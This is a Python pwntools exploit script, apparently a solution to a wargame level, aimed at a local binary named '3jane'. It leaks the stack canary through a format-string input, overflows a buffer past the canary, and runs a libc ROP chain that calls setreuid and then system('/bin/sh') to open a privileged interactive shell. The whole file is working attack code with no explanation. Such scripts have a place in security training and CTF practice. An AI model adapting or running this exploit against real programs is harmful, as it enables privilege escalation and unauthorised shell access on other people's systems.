import sys
from pwn import *

context.arch = 'amd64'
io = process("/home/level06/3jane")

io.recvuntil(b"ID: ")
io.sendline(b"%15$p")
io.recvuntil(b"Logging: ")
stack_canary = io.recvline().decode().strip()[2:]
io.recvuntil(b"Access code: ")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x7ffff7c00000

rop = ROP(libc)

ROP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
ROP_RSI = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]

SETREUID = libc.sym["setreuid"]
SYSTEM = libc.sym["system"]

BIN_SH = next(libc.search(b"/bin/sh"))

rop_chain = b""
rop_chain += p64(ROP_RDI)
rop_chain += p64(1023)
rop_chain += p64(ROP_RSI)
rop_chain += p64(1023)
rop_chain += p64(0xdeadbeef)
rop_chain += p64(SETREUID)
rop_chain += p64(ROP_RDI)
rop_chain += p64(BIN_SH)
rop_chain += p64(rop.ret[0])
rop_chain += p64(SYSTEM)

payload = b"A" * 136
payload += p64(int(stack_canary, 16))
payload += b"A" * 8
payload += rop_chain

io.sendline(payload)

io.interactive()